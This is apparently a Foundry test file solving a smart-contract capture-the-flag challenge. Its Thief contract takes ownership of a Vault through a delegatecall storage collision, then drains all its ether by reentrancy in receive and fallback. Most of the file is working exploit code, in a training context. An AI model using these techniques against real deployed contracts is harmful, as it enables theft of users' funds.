// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test} from "forge-std/Test.sol";
import "../src/Vault.sol";

contract Thief {
    Vault public vault;
    VaultLogic public logic;

    constructor(Vault _vault, VaultLogic _logic) {
        vault = _vault;
        logic = _logic;
    }

    function init() public payable {}

    function attack() public {
        (bool success,) = address(vault).call(
            abi.encodeWithSignature(
                "changeOwner(bytes32,address)", 
                bytes32(uint256(uint160(address(logic)))),
                address(this)
            )
        );
        require(success, "changeOwner failed");
        vault.deposite{ value: 0.1 ether }();
        vault.openWithdraw();
        vault.withdraw();
    }

    receive() external payable {
        if (address(vault).balance > 0) {
            vault.withdraw();
        }
    }

    fallback() external payable {
        if (address(vault).balance > 0) {
            vault.withdraw();
        }
    }
}


contract VaultExploiter is Test {
    Vault public vault;
    VaultLogic public logic;

    address owner = address (1);
    address palyer = address (2);

    function setUp() public {
        vm.deal(owner, 1 ether);

        vm.startPrank(owner);
        logic = new VaultLogic(bytes32("0x1234"));
        vault = new Vault(address(logic));

        vault.deposite{value: 0.1 ether}();
        vm.stopPrank();

    }

    function getSlot(uint256 slot) public view returns (uint256) {
        return uint256(vm.load(address(vault), bytes32(slot)));
    }

    function testExploit() public {
        vm.deal(palyer, 1 ether);
        vm.startPrank(palyer);
        // add your hacker code.
        Thief thief = new Thief(vault, logic);
        thief.init{ value: 0.1 ether }();
        thief.attack();
        require(vault.isSolve(), "solved");
        assertEq(address(vault).balance, 0, "vault balance is not 0");
        vm.stopPrank();
    }

}
